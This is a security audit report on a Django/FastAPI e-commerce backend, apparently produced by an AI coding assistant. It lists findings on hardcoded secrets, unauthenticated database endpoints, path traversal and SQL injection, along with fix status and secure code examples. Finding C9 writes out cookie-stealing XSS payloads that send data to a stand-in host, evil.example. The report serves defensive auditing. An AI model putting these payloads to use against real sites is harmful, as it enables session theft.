# Security Audit — myecomanalyzer_backend

**Date:** 2026-07-18
**Scope:** `E:\Beyond_Compare_setup\Temporary\myecomanalyzer_backend` (Django 5.2 + FastAPI hybrid)
**Method:** Four parallel code-level audits (injection/unsafe-exec, auth/session/JWT, secrets/dependencies/supply-chain, web-config/CORS/infra/CI), findings deduplicated and cross-verified below.

> **Note on redaction:** actual secret values found hardcoded in source are redacted in this document (shown as `***`). The real values are visible at the exact file/line cited — this file documents *that a secret exists there*, not the secret itself, so this report is safer to share with teammates than the source files that actually contain the credentials.

## Remediation Status (2026-07-18)

| ID | Finding | Status |
|---|---|---|
| C1 | Hardcoded Django `SECRET_KEY` | ✅ Fixed — `config("SECRET_KEY")`, no default |
| C2 | `DEBUG = True` hardcoded | ✅ Fixed — env-driven, unconditional `ALLOWED_HOSTS`/`CSRF_TRUSTED_ORIGINS` |
| C3 | Weak `JWT_SECRET_KEY` fallback | ✅ Fixed — `config("JWT_SECRET_KEY")`, no default |
| C4 | `/db/restore`+`/db/dump`: hardcoded creds, path traversal, arbitrary SQL exec | ✅ Fixed (auth + filename allow-list + no hardcoded creds) — **but rotate the exposed password now, this doesn't undo prior exposure** |
| C5 | `/db/upload-csv`: hardcoded root creds, unvalidated columns | ✅ Fixed — auth added, creds env-only, column names validated |
| C6 | Real DB backups committed, not gitignored | ⬜ **Your side** — you're handling `.gitignore` + git-history purge |
| C7 | Unauthenticated hard-delete product IDOR | ✅ Fixed — auth + ownership check added |
| C8 | Unauthenticated legacy `/login` | ✅ Fixed — route no longer registered |
| C9 | Unescaped Jinja2 → XSS/SSRF/LFI in biodata renderer | ✅ Fixed — autoescape, URL-scheme sanitization, `disable-local-file-access`, template allow-list |
| C10 | Django ASGI never mounted (dead security settings) | ⬜ **Architectural decision, not made for you** — see note below |
| H1 | Legacy `/signup` bypasses password policy | ✅ Fixed — route no longer registered |
| H2 | `SecurityHeadersMiddleware` never wired in | ✅ Fixed — `setup_security_middleware(app)` now called in `main.py` |
| H3 | Signup rate-limit claimed but not enforced | ✅ Fixed — real check + attempt logging added |
| H4 | PDF-upload filename path traversal | ✅ Fixed — server-generated filename |
| M1 | CORS triplicated/hardcoded | ✅ Fixed — single env-driven source (`settings.CORS_ALLOWED_ORIGINS`), wildcard fallback removed |
| M2 | `/auth/refresh` rate limit silent no-op | ✅ Fixed — real in-memory per-IP limiter |
| M3 | CAPTCHA endpoints no rate limit | ✅ Fixed |
| M4 | Forgot-password/verify-otp/reset-password: no rate limit + timing leak | ✅ Fixed — rate limiting added; timing gap narrowed (not fully closed — see finding text) |
| M5 | Marriage-auth crash bug + enumeration | ✅ Fixed — signature corrected, generic error |
| M6 | Non-CSPRNG CAPTCHA code | ✅ Fixed — `secrets.choice` |
| M7 | `google-genai` unpinned | ⬜ **Needs your env** — TODO comment added, I don't have a Python env to check the installed version |
| M8 | No lockfile/hash-pinning | ⬜ Not done — process/tooling change (`pip-compile`), not a file edit |
| L1 | Unused `PyJWT` | ✅ Fixed — removed from `requirements.txt` |
| L2 | Dead broken `auth_controller.py` | ✅ Fixed — deleted |
| L3 | Refresh token in JSON body vs unused cookie helper | ⬜ Not done — changing this breaks the frontend's current token handling unless coordinated together; flagging rather than silently changing the API contract |
| L4 | Missing null-checks in product controller | ✅ Fixed |
| L5 | In-memory `RateLimitMiddleware` | ⬜ Not done — needs Redis for multi-worker deployments, infra decision |
| L6 | Undefined `OTP_*` settings | ✅ Fixed — defined with safe defaults + a startup guard on `OTP_DEBUG_MODE` |
| L7 | `ecdsa` transitive CVE | ⬜ Not done — dependency-tree decision, no direct usage found to change |
| L8 | Supabase project ref hardcoded | ✅ Fixed — `config("SUPABASE_S3_ENDPOINT_URL")`, no default |
| L9 | Hardcoded local MySQL creds | ✅ Fixed (same change as C5) |

**On C10:** I did not mount Django's ASGI app under FastAPI, and I did not strip Django's security settings either — that's a real architectural fork (is Django meant to ever serve HTTP requests here, or is it ORM-only forever?) that changes behavior either way, and isn't mine to decide. What I did do: made the security headers, CORS, and rate-limiting that Django's settings implied actually take effect, by wiring `setup_security_middleware(app)` into the live FastAPI app (H2) and consolidating CORS to one source (M1). So the practical gap — headers/CORS not actually applied — is closed; the "why does Django have security settings it never uses" architectural question is still open if you want to revisit it.

**A new required env var list was added to `.env.example`** — the app will not start until you populate `.env` with real values for `SECRET_KEY`, `JWT_SECRET_KEY`, and `SUPABASE_S3_ENDPOINT_URL` at minimum (these now have no fallback default). `SOURCE_DB_*`/`CSV_MYSQL_*` are only required if you actually use those two ops endpoints.

---

## CRITICAL

### C1. Hardcoded Django `SECRET_KEY` committed to source

Severity: Critical
OWASP: A02:2021 – Cryptographic Failures
CWE: CWE-798 (Use of Hard-coded Credentials), CWE-321

Location: `core/settings.py:32`

```python
SECRET_KEY = 'django-insecure-***'
```

Explanation: Django's `SECRET_KEY` signs sessions, CSRF tokens, and password-reset tokens. It's hardcoded as a literal, not read from an environment variable, despite `.env.example` implying it should be. The `django-insecure-` prefix is Django's own marker meaning "dev-only, replace before production."

Attack scenario: Anyone with read access to this source (or a future public/shared copy of it) can forge signed cookies or tokens that depend on this key.

Recommendation: Load from env with no insecure default; rotate the key.

Secure code example:
```python
SECRET_KEY = config("DJANGO_SECRET_KEY")  # raises if unset — fail loudly, don't silently fall back
```

---

### C2. `DEBUG = True` hardcoded — disables the entire production security block

Severity: Critical
OWASP: A05:2021 – Security Misconfiguration
CWE: CWE-489 (Active Debug Code), CWE-215 (Information Exposure Through Debug Information)

Location: `core/settings.py:35`

```python
DEBUG = True
```

Explanation: This is a literal, not `config("DEBUG", default=False, cast=bool)`. Because of it:
- `SESSION_COOKIE_SECURE = not DEBUG` (line 239) evaluates to **False** always.
- `CSRF_COOKIE_SECURE = not DEBUG` (line 242) evaluates to **False** always.
- The `if not DEBUG:` block (lines 254–257) that sets `SECURE_SSL_REDIRECT=True` and derives `ALLOWED_HOSTS`/`CSRF_TRUSTED_ORIGINS` from env **never runs**.
- If Django's own error pages are ever hit, full stack traces/settings/SQL would be exposed.

Attack scenario: Any deployment of this file as-is runs with debug-mode security completely disabled, regardless of what environment it's actually running in.

Recommendation: Env-driven, unconditional application of the secure settings.

Secure code example:
```python
DEBUG = config("DEBUG", default=False, cast=bool)
SESSION_COOKIE_SECURE = not DEBUG
CSRF_COOKIE_SECURE = not DEBUG
SECURE_SSL_REDIRECT = not DEBUG
ALLOWED_HOSTS = config("ALLOWED_HOSTS", default="localhost,127.0.0.1", cast=lambda v: [s.strip() for s in v.split(",")])
```

---

### C3. Weak hardcoded fallback for the JWT signing secret

Severity: Critical
OWASP: A02:2021 – Cryptographic Failures / A07:2021 – Identification and Authentication Failures
CWE: CWE-798, CWE-1188 (Insecure Default Initialization)

Location: `core/settings.py:213`

```python
JWT_SECRET_KEY = os.environ.get("JWT_SECRET_KEY", "***")
```
(the real fallback value is a short, guessable string resembling a personal name — visible at the cited line)

Explanation: This is the actual signing key for every custom access/refresh JWT (`api/token_manager.py`). If the env var is ever unset (misconfigured deploy, staging without secrets wired), the app silently signs and verifies tokens with this fixed, low-entropy, committed string.

Attack scenario: Anyone who reads this source and finds the env var unset in some environment can forge a valid JWT for any `user_id`, including an admin account — full authentication bypass.

Recommendation: No default — fail startup if unset.

Secure code example:
```python
JWT_SECRET_KEY = config("JWT_SECRET_KEY")  # raises ImproperlyConfigured if unset
```

---

### C4. Unauthenticated DB dump/restore endpoints: hardcoded real production DB credentials + path traversal → arbitrary SQL execution

Severity: Critical
OWASP: A01:2021 – Broken Access Control, A03:2021 – Injection
CWE: CWE-306 (Missing Authentication for Critical Function), CWE-22 (Path Traversal), CWE-798, CWE-89

Location: `api/v_1/apis_endpoint/db_dump_v1.py:14-18` (credentials), `:162-176` (path traversal), `:189-195` (arbitrary execution); mounted at `POST /api/v1/db/restore` and `GET /api/v1/db/dump` via `api/router.py:68` with **no `Depends(get_current_user)` anywhere in the file**.

```python
SOURCE_HOST = os.getenv("SOURCE_DB_HOST", "***.pooler.supabase.com")
SOURCE_USER = os.getenv("SOURCE_DB_USER", "postgres.***")
SOURCE_PASSWORD = os.getenv("SOURCE_DB_PASSWORD", "***")
...
@router.post("/restore")
def restore_database(filename: str | None = None):
    filepath = os.path.join(BACKUP_DIR, filename)   # no os.path.basename(), no ".." check
    ...
    cur.execute(sql_content)                          # entire file content run verbatim as SQL
```

Explanation: This stacks three separate critical issues: (1) a real-looking production Supabase Postgres hostname, username, and password are hardcoded as fallback defaults directly in source (verified against the project ref also hardcoded in `core/settings.py:321`'s S3 endpoint default, confirming it's the same live project); (2) `filename` is concatenated into a path with zero sanitization — `../../anything` escapes `BACKUP_DIR`; (3) the resulting file's *entire contents* are executed verbatim as SQL with no restriction on statement type.

Attack scenario: Any unauthenticated caller can read arbitrary files reachable via path traversal and have them executed as SQL against the production database (data exfiltration, `DROP TABLE`, or worse if the DB user has elevated rights) — or simply lift the hardcoded password straight out of source.

Recommendation: Rotate this database password now (treat as compromised). Require admin auth + authorization on both routes. Never `cur.execute()` a whole file blob. Validate `filename` against a strict allow-list. Strongly consider removing this endpoint from the deployed API entirely — it belongs in an offline ops script, not an HTTP route.

Secure code example:
```python
import re
from api.auth import get_current_admin_user  # or equivalent admin-only dependency

@router.post("/restore", dependencies=[Depends(get_current_admin_user)])
def restore_database(filename: str):
    if not re.fullmatch(r"prod_backup_\d{8}_\d{6}\.sql", filename):
        raise HTTPException(400, "Invalid filename")
    filepath = os.path.join(BACKUP_DIR, os.path.basename(filename))
    # then invoke psql/pg_restore as a subprocess with an argument list — never cur.execute() a raw file blob
```

---

### C5. Unauthenticated CSV-upload endpoint with hardcoded root MySQL credentials and unvalidated identifier interpolation

Severity: Critical
OWASP: A01:2021 – Broken Access Control, A03:2021 – Injection
CWE: CWE-306, CWE-798, CWE-89

Location: `api/v_1/apis_endpoint/csv_dump.py:9-11` (credentials), `:63,71-73,78` (SQL identifiers), mounted at `POST /api/v1/db/upload-csv` with no auth dependency.

```python
DB_HOST = "localhost"
DB_USER = "root"
DB_PASSWORD = "***"
...
cursor.execute(f"SHOW TABLES LIKE '{table_name}'")
create_query = f"CREATE TABLE `{table_name}` ({', '.join(columns_def)})"
```

Explanation: `table_name`/`db_name` are validated with `str.isidentifier()` before use (meaningfully mitigating injection there), but the uploaded CSV's **column names** (`col` from `df.columns`) are placed into the `CREATE TABLE` statement with only backtick-wrapping and **no validation at all**. Combined with hardcoded root credentials and no authentication, this is a critical stack.

Attack scenario: Anonymous caller uploads a CSV with a crafted column-name header (e.g. containing a backtick to break out of identifier quoting) to inject SQL into the `CREATE TABLE` statement, executed with root MySQL privileges — or simply connects as root to any database on the host via the attacker-supplied `db_name`.

Recommendation: Require authentication, remove hardcoded root credentials, validate every CSV column name the same way `table_name` is validated, restrict to a fixed known target database rather than accepting `db_name` from the request.

Secure code example:
```python
if not col.isidentifier() or len(col) > 64:
    raise HTTPException(400, f"Invalid column name: {col}")
```

---

### C6. Real database backup dumps (PII + password hash) committed in the repo, not gitignored

Severity: Critical
OWASP: A05:2021 – Security Misconfiguration
CWE: CWE-538 (File and Directory Information Exposure), CWE-312 (Cleartext Storage of Sensitive Information)

Location: `backups/myecomanalyzer_20260317_225641.sql`, `backups/myecomanalyzer_20260317_225951.sql` (identical, ~62KB each). `.gitignore` has no `backups/` or `*.sql` entry.

Explanation: These are full SQL dumps of what appears to be the real/personal database — containing a real-looking email address and a PBKDF2 password hash for `auth_user` id 1 (line 128 of both files). This directly corroborates C4 — these are exactly the kind of dump that `/api/v1/db/dump` produces against the real Supabase instance.

Attack scenario: If this repo is ever pushed to a shared or public git remote, or shared as a zip/backup with anyone, real user PII and a password hash go with it.

Recommendation: Add `backups/` and `*.sql` to `.gitignore` now. If this was ever committed to git history, purge it (`git filter-repo` or BFG) rather than just deleting the working-tree copy. Rotate the affected account's password as a precaution. Store backups outside the repo entirely.

Secure code example (`.gitignore` addition):
```
backups/
*.sql
```

---

### C7. Unauthenticated hard-delete product endpoint — full IDOR

Severity: Critical
OWASP: A01:2021 – Broken Access Control
CWE: CWE-639 (IDOR), CWE-306

Location: `api/v_1/apis_endpoint/product_v1.py:96-98`, `api/controllers/product_controller.py:547-577`

```python
@router.delete("/del_products/{product_id}")
def delete_product(product_id: int):
    return ProductController.delete_product(product_id)
```

Explanation: No `current_user` dependency at all, and the controller never filters by `owner=current_user` — it just deletes settlements, orders, variants, and the product by raw ID. Note: a *different*, correctly-authenticated route with the same function name exists at a different path (`/deletebyId/{product_id}`) — Python allows the name collision, but FastAPI already registered both routes at decoration time, so **both are live**, and this one has no protection at all.

Attack scenario: Anonymous caller enumerates `product_id` 1..N and permanently hard-deletes any tenant's products, variants, orders, and settlements.

Recommendation: Remove this route, or require auth + ownership filtering identical to the sibling `/deletebyId/{product_id}` route.

Secure code example:
```python
@router.delete("/del_products/{product_id}")
def delete_product(product_id: int, current_user: User = Depends(get_current_user)):
    return ProductController.delete_product(product_id, current_user)  # filter by owner=current_user inside
```

---

### C8. Unauthenticated legacy login endpoint bypasses all brute-force/CAPTCHA protections

Severity: Critical
OWASP: A07:2021 – Identification and Authentication Failures
CWE: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-204 (user enumeration)

Location: `api/login.py:1-68`, mounted live at `/api/v1/login/login` via `api/router.py:27` — comment there calls it "deprecated" but it is still registered and reachable, issuing the exact same valid JWTs as the hardened `/auth/login`.

Explanation: No CAPTCHA, no `RateLimiter`, no `BruteForceProtection`, no account lockout — every defense `api/auth_endpoints.py`'s `/auth/login` enforces is entirely absent here. It also returns distinct 401 ("invalid email or password") vs 403 ("account inactive") responses, leaking account existence/state.

Attack scenario: Attacker ignores the hardened `/auth/login` and brute-forces `/api/v1/login/login` unthrottled — unlimited attempts per second, with an account-existence oracle via the 403 branch.

Recommendation: Delete this route (and the sibling `api/signup.py`, see H1) now that `/auth/login`/`/auth/signup` exist, or route it through the identical `RateLimiter`/`BruteForceProtection`/CAPTCHA pipeline and unify error responses to a generic message.

---

### C9. Unescaped Jinja2 template rendering → XSS + SSRF/local-file-read via biodata PDF/preview

Severity: Critical
OWASP: A03:2021 – Injection (XSS); SSRF maps to A10:2021
CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-918 (SSRF)

Location: `api/controllers/marriage_biodata_controller.py:11` (`Environment(loader=FileSystemLoader("templates"))` — no autoescape), `:36-56` (`render_html`/`generate_pdf`), `api/v_1/apis_endpoint/marriage_biodata_v1.py:14-27` (`/preview-html` returns raw rendered HTML), `api/schemas/marriage_biodata_schema.py:4-7` (`data: Dict[str, Any]`, fully attacker-controlled), `templates/marriage-modern.html` (interpolates fields unescaped, including inside a `src="..."` attribute).

Explanation: Jinja2's `Environment` is constructed without `autoescape=True`/`select_autoescape()` (Jinja2's default is `False`). Every field in the attacker-supplied `data` dict is interpolated directly into HTML that's then either (a) returned to the browser as `media_type="text/html"`, or (b) fed to `pdfkit.from_string()` (wkhtmltopdf).

Attack scenario 1 (reflected XSS): `POST /preview-html` with `data.personal.name` = `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` — served back as raw HTML, executes in whoever's browser renders it.

Attack scenario 2 (attribute-breakout XSS): `personal.photo` = `x" onerror="fetch('https://evil.example/steal?c='+document.cookie)` breaks out of the `src="..."` attribute in `templates/marriage-modern.html`.

Attack scenario 3 (SSRF/LFI via PDF generation): `personal.photo` = an internal URL (e.g. cloud metadata endpoint or internal service) — wkhtmltopdf's headless WebKit fetches it while rendering; no `--disable-local-file-access` configuration was found anywhere, so `file://` URIs may also leak local files into the generated PDF.

Recommendation: Enable autoescaping. Don't return raw rendered HTML built from arbitrary user data directly as a top-level response. Validate/allow-list URL fields before interpolation (protocol restriction, ideally your own asset domain only). Configure wkhtmltopdf with `--disable-local-file-access` and disable remote content loading. Also validate `template_id` against the registered `Template` model before rendering (currently only `save_biodata` does this check — `render_html`/`generate_pdf` don't, so any `.html` file in `templates/` can be rendered).

Secure code example:
```python
from jinja2 import Environment, FileSystemLoader, select_autoescape

env = Environment(
    loader=FileSystemLoader("templates"),
    autoescape=select_autoescape(["html"]),
)
```

---

### C10. FastAPI never mounts the Django ASGI app — Django's security settings are dead code

Severity: Critical
OWASP: A05:2021 – Security Misconfiguration
CWE: CWE-1188 (Insecure Default Initialization)

Location: `main.py` (whole file), `core/wsgi.py:16`, `core/asgi.py:16`

Explanation: The deployment entrypoint is FastAPI/uvicorn. `main.py` only calls `django.setup()` to initialize Django's ORM/app registry — it never mounts `get_asgi_application()`/`get_wsgi_application()` into the FastAPI `app` (confirmed via repo-wide grep: no `app.mount`, no `WSGIMiddleware` anywhere). That means Django's `MIDDLEWARE` stack (`SecurityMiddleware`, `corsheaders`, `CsrfViewMiddleware`, `XFrameOptionsMiddleware`) and every Django-side setting analyzed above (`CORS_ALLOWED_ORIGINS`, cookie flags, SSL redirect) **never runs against any real HTTP request** — only whatever is wired directly into FastAPI in `main.py` actually takes effect.

Attack scenario: This isn't directly exploitable by itself, but it means the "hardened" Django config throughout this file is a false sense of security — anyone reading `settings.py` in isolation would believe protections exist that are never actually applied.

Recommendation: Either mount Django's ASGI app under FastAPI if Django views are meant to be reachable, or — since Django here is ORM-only — strip the unused Django security settings to avoid the false impression, and implement all real protections (CORS, security headers, rate limiting) directly as FastAPI/Starlette middleware, which is the only code path serving traffic. See H2 below for one already-written piece of this that's sitting unused.

---

## HIGH

### H1. Legacy signup endpoint bypasses password policy, CAPTCHA, and rate limiting

Severity: High
OWASP: A07:2021
CWE: CWE-521 (Weak Password Requirements), CWE-307

Location: `api/signup.py:1-70`, mounted live at `/api/v1/signup/` via `api/router.py:26`

Explanation: `PasswordValidator.validate()` is never called here — `User.objects.create_user(..., password=user.password)` accepts any password including a single character. No CAPTCHA, no per-IP rate limit either.

Recommendation: Remove this route (superseded by `/auth/signup`), or reuse `PasswordValidator`, `CaptchaService`, and `RateLimiter` if it must stay.

---

### H2. `SecurityHeadersMiddleware` is fully written but never wired into the running app

Severity: High
OWASP: A05:2021
CWE: CWE-1021 (Missing X-Frame-Options in practice), CWE-319

Location: `api/security_middleware.py:19-34` (defines `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`), `:114` (`setup_security_middleware()` — never called anywhere, confirmed via grep: zero call sites outside its own definition).

Explanation: This is good code that simply isn't being used. None of these security headers are actually sent by the live FastAPI app today.

Recommendation: Call `setup_security_middleware(app)` from `main.py` right after `app = FastAPI(...)`.

---

### H3. Signup docstring claims rate limiting that's never implemented

Severity: High
OWASP: A04:2021 – Insecure Design
CWE: CWE-307, CWE-799

Location: `api/auth_endpoints.py:184-327` (docstring at line 190 says `"Rate limit: 10 signups per hour per IP"`)

Explanation: No call to `RateLimiter.check_rate_limit`/`check_ip_rate_limit` exists anywhere in the function body, and no CAPTCHA (unlike `/auth/login`, which does require one). `settings.RATE_LIMIT_SIGNUP_PER_HOUR` is defined in `core/settings.py:232` but never referenced by any code.

Recommendation:
```python
allowed, error = RateLimiter.check_ip_rate_limit(
    ip_address, limit=settings.RATE_LIMIT_SIGNUP_PER_HOUR, window_seconds=3600
)
if not allowed:
    raise HTTPException(status_code=429, detail=error)
```

---

### H4. Unsanitized upload filename written directly to disk (path traversal)

Severity: High
OWASP: A03:2021 / A01:2021
CWE: CWE-22

Location: `api/v_1/apis_endpoint/pdf_import_v1.py:29`

```python
file_path = os.path.join(UPLOAD_DIR, file.filename)
```

Explanation: `file.filename` is the client-supplied filename from the multipart header and is never sanitized (the extension check elsewhere doesn't touch path components). This endpoint does require authentication, which is why this isn't Critical, but there's no path sanitization at all.

Attack scenario: An authenticated user uploads a file named `../../../../somefile.pdf` to write outside the intended upload directory.

Recommendation: Generate a random filename server-side and keep only the validated extension (the existing `api/utils/s3_service.py:37` already does this correctly — apply the same pattern here).

Secure code example:
```python
import uuid
safe_name = f"{uuid.uuid4()}{os.path.splitext(file.filename)[1].lower()}"
file_path = os.path.join(UPLOAD_DIR, safe_name)
```

---

## MEDIUM

### M1. CORS configuration triplicated and hardcoded across three files, with a dead fallback that degrades to wildcard+credentials

Severity: Medium
OWASP: A05:2021
CWE: CWE-942 (Permissive Cross-domain Policy)

Location: `core/settings.py:40-44` (dead, per C10), `main.py:74-86` (the one actually live — explicit origin list + credentials, hardcoded, no env var, missing some deployed frontend origins already showing drift), `api/security_middleware.py:134-143` (dead per H2, but its fallback `cors_origins = ... if hasattr(...) else ["*"]` combined with `allow_credentials=True` would be a classic wildcard+credentials misconfiguration if this middleware is ever wired in without noticing the fallback).

Explanation: The live config (`main.py`) is currently safe (explicit origins, not `*`), but three independent, drifting definitions of the same thing is itself a maintainability/security risk, and the unused one contains a latent trap.

Recommendation: Consolidate to one env-driven origin list consumed only where CORS middleware is actually added; delete the other two.

---

### M2. Refresh-token endpoint's rate limit is a silent no-op

Severity: Medium
OWASP: A07:2021
CWE: CWE-307

Location: `api/auth_endpoints.py:526-534`

Explanation: `RateLimiter.check_ip_rate_limit` (`api/auth_utils.py:123-148`) counts rows in the `LoginAttempt` table. Only `login()` ever writes to that table (via `BruteForceProtection.log_failed_attempt`/`log_successful_attempt`) — `/auth/refresh` never does, so its own "rate limit" check reads a table its own traffic never populates. This is the same class of bug already found and fixed once in this codebase for the OTP/password-reset flow — worth checking for elsewhere too.

Attack scenario: Unlimited refresh-token guessing/replay attempts from an IP that never separately calls `/auth/login` pass through with no real throttling.

Recommendation: Give refresh attempts their own counter (dedicated model or Redis/cache counter keyed by IP), independent of `LoginAttempt`.

---

### M3. CAPTCHA generate/verify/validate endpoints have no rate limiting

Severity: Medium
OWASP: A04:2021
CWE: CWE-770 (Uncontrolled Resource Consumption)

Location: `api/auth_endpoints.py:484-509`

Recommendation: Add per-IP rate limiting to CAPTCHA generation at minimum (each generation does image rendering + a DB write).

---

### M4. Forgot-password/verify-otp/reset-password endpoints: no rate limiting, plus a timing side-channel for enumeration

Severity: Medium
OWASP: A04:2021
CWE: CWE-799, CWE-208 (Observable Timing Discrepancy)

Location: `api/password_reset_endpoints.py:24-63`, `api/controllers/password_reset_controller.py:36-106`

Explanation: None of the three endpoints call any rate limiter — the code already correctly avoided reusing the broken `LoginAttempt`-based limiter (see project history), and added a per-user resend cooldown instead, but there's no cross-identifier/IP throttle at all. Separately: requesting an OTP for a non-existent identifier returns immediately, while an existing one performs a DB write plus a synchronous SMTP/SNS call before responding — a measurable timing difference despite the identical response text.

Attack scenario: Attacker floods `/forgot-password` across many identifiers (incurring real SMS/email cost), and can distinguish valid from invalid accounts by response latency alone.

Recommendation: Add per-IP rate limiting on `/forgot-password`. Consider queuing delivery asynchronously so response time doesn't depend on whether the account exists.

---

### M5. Secondary "marriage" auth subsystem is unhardened (and currently broken)

Severity: Medium
CWE: CWE-204 (enumeration)

Location: `api/controllers/marriage_auth_controller.py:45-62`

Explanation: A completely separate login path with no CAPTCHA/rate-limit/lockout, and a 404 vs 401 split that leaks account existence. Also currently non-functional — `TokenManager.create_access_token({"sub": user.email})` doesn't match the method's real signature (`create_access_token(cls, user_id, username, ...)`), so this will raise `TypeError` at runtime as written. Flagged because it shows the intended design lacks the same protections as the primary auth flow, in case someone "fixes" the crash without addressing that.

Recommendation: Route through the same `RateLimiter`/`BruteForceProtection`/`CaptchaService` used elsewhere, fix the signature mismatch, use a generic error for both branches.

---

### M6. CAPTCHA code generated with non-CSPRNG `random` module

Severity: Medium
OWASP: A02:2021
CWE: CWE-330, CWE-338

Location: `api/captcha_service.py:26-28`

```python
return "".join(random.choices(characters, k=cls.CODE_LENGTH))
```

Explanation: `random.choices()` uses the (non-cryptographic) Mersenne Twister PRNG. Not Critical/High because the code is hashed with SHA-256 and requires solving the rendered image anyway, but it's the wrong primitive for a security control.

Recommendation:
```python
import secrets
return "".join(secrets.choice(characters) for _ in range(cls.CODE_LENGTH))
```
(The other `random.randint()` calls in the same file are purely cosmetic image-noise coordinates — not security-sensitive, no fix needed there.)

---

### M7. `google-genai` dependency has no version pin

Severity: Medium
OWASP: A06:2021 – Vulnerable and Outdated Components
CWE: CWE-1104

Location: `requirements.txt` (last line)

Recommendation: Pin to an exact tested version.

---

### M8. No lockfile / no hash-pinning for Python dependencies

Severity: Medium
OWASP: A06:2021 / A08:2021 – Software and Data Integrity Failures
CWE: CWE-494 (Download of Code Without Integrity Check)

Location: repo root (only `requirements.txt`, no `poetry.lock`/`Pipfile.lock`/hash-pinned requirements)

Recommendation: Adopt `pip-tools` (`pip-compile --generate-hashes`) and install with `--require-hashes` in deployment, to guard against index tampering/dependency confusion.

---

## LOW / INFORMATIONAL

| # | Finding | Location |
|---|---|---|
| L1 | `PyJWT` installed but never imported anywhere (dead weight vs. `python-jose`/`djangorestframework_simplejwt`) — remove to shrink attack surface | `requirements.txt`, confirmed via repo-wide grep for `import jwt` |
| L2 | Dead code with broken imports (`from core.auth import create_access_token` — `core/auth.py` doesn't exist; also a `@translation.atomic` typo for `transaction.atomic`) — cannot even be imported, not wired to any router, but is a duplicate unhardened signup/login implementation that could be mistakenly reintroduced | `api/controllers/auth_controller.py:9,11,36` |
| L3 | `_store_refresh_token_in_cookie` helper has correct secure flags (`httponly`, `secure`, `samesite="strict"`) but is never called — refresh tokens are returned in the JSON body instead, more exposed to XSS-based theft than the intended cookie flow | `api/auth_endpoints.py:163-180` |
| L4 | `delete_product_logic`/`toggle_product_active_logic` don't null-check `get_product_by_id()`'s result before use — an attacker probing another tenant's product ID gets an unhandled 500 instead of a clean 404 (not IDOR — ownership filtering is correct, just missing an explicit check) | `api/controllers/product_controller.py:495-513` |
| L5 | `RateLimitMiddleware` uses an in-memory per-process dict — won't work correctly across multiple gunicorn/uvicorn workers, and 1000 req/min is generous enough to add little real protection to auth-sensitive routes on its own | `api/security_middleware.py:60-96,129` |
| L6 | `password_reset_controller.py` reads `settings.OTP_EXPIRY_MINUTES`/`OTP_MAX_ATTEMPTS`/`OTP_RESET_TOKEN_EXPIRY_MINUTES`/`OTP_DEBUG_MODE`/`OTP_RESEND_COOLDOWN_SECONDS` — **none of these are defined anywhere in `core/settings.py`**. This will raise at import/runtime as-is. Functional bug, but note: if `OTP_DEBUG_MODE` is added later and ever defaults to `True` in a reachable environment, the forgot-password endpoint would return the plaintext OTP in the API response — that would be Critical, not Informational, so define it explicitly and safely now | `api/controllers/password_reset_controller.py:17-21`, `core/settings.py` |
| L7 | `ecdsa` transitive dependency (likely pulled in by `python-jose`/`rsa`) has a publicly acknowledged, maintainer-stated-as-unfixed timing-attack weakness (commonly referenced as CVE-2024-23342) — no direct EC key usage found in app code, so likely dormant, but worth confirming it's not exercised anywhere | `requirements.txt` (`ecdsa==0.19.1`) |
| L8 | Real Supabase project reference disclosed as a hardcoded URL default (not a credential itself, but an infra fingerprint that corroborates C4) | `core/settings.py:321` |
| L9 | Hardcoded local MySQL credentials (`root`/a literal password) not env-driven at all | `api/v_1/apis_endpoint/csv_dump.py:9-11` |

**Confirmed clean — no findings:** SQL injection via Django ORM (no `.raw()`/`.extra()`/string-built queries found in ORM code), Command Injection (`shell=True`/`os.system` never used), XXE (no XML parsing anywhere), SSRF via outbound HTTP (no user-controlled outbound requests), unsafe deserialization (`pickle`/`yaml.load`/`eval`/`exec` never used), insecure tempfile usage (`tempfile` module not even imported), JWT signature/algorithm/exp/aud/iss validation (`token_manager.py` correctly restricts algorithms, checks expiry, audience, issuer — no algorithm-confusion or "none" bypass), password hashing (Django default PBKDF2, OTP/reset-token secrets correctly hashed via `django.contrib.auth.hashers`), CSRF (Bearer-token auth throughout, not cookie-session-based, so CSRF doesn't apply by design — this is correct, not an oversight), refresh-token rotation/reuse-detection logic (sound), privilege escalation via request body (roles never client-supplied), sensitive-data logging (no tokens/passwords/OTPs logged in plaintext), open redirects (no redirect logic exists anywhere in the app), file permissions (no `chmod`/permissive mode file creation found), `.env` handling (`.env` correctly gitignored, no actual `.env` committed). **No Dockerfile, docker-compose, GitHub Actions, nginx config, Terraform, or Kubernetes manifests exist in this repo** — infra/CI/container hardening categories are not applicable; there's simply nothing there yet.

---

## Executive Summary

This backend has some genuinely well-built security code — JWT validation, password hashing, refresh-token rotation, and the newer OTP/password-reset flow are all implemented correctly and follow good practice. The problem is that a significant amount of it **isn't actually connected to the running system**: the hardened `/auth/*` endpoints coexist with older, completely unprotected `login.py`/`signup.py`/`auth_controller.py` routes that are still live; a fully-written `SecurityHeadersMiddleware` is never called; and Django's own security settings never run at all because the FastAPI app never mounts Django's ASGI application. Layered on top of that structural gap are several genuinely severe, directly exploitable issues: **hardcoded production database credentials sitting in source next to an unauthenticated, path-traversal-vulnerable SQL-execution endpoint**, **real database backups (with PII and a password hash) committed unignored to the repo**, an **unauthenticated hard-delete endpoint** for products, and an **unescaped-HTML injection point** feeding both a browser response and a PDF renderer. None of these require any special access to exploit — they're reachable by anonymous requests today.

**The single highest-priority action, ahead of any code fix:** rotate the Supabase database password now, and purge the committed backup dumps from git history. Everything else can be fixed on a normal schedule; that one is a live, already-exposed secret.

## Risk Score: 22/100

(0 = maximally insecure, 100 = fully hardened — scored low primarily because of the combination of live hardcoded production credentials, unauthenticated arbitrary-SQL and hard-delete endpoints, and an unescaped-HTML injection point, all independently exploitable without any authentication.)

## Top 10 Issues to Fix First

1. **Rotate the Supabase DB password and any other credential visible in `db_dump_v1.py`** (C4) — treat as already compromised.
2. **Remove or fully authenticate `db_dump_v1.py` and `csv_dump.py`** (C4, C5) — arbitrary SQL execution + hardcoded root MySQL creds, both unauthenticated.
3. **Purge `backups/*.sql` from the repo and git history; add to `.gitignore`** (C6).
4. **Fix or remove the unauthenticated hard-delete product route** (C7).
5. **Delete/disable `api/login.py` and `api/signup.py`** now that hardened equivalents exist (C8, H1).
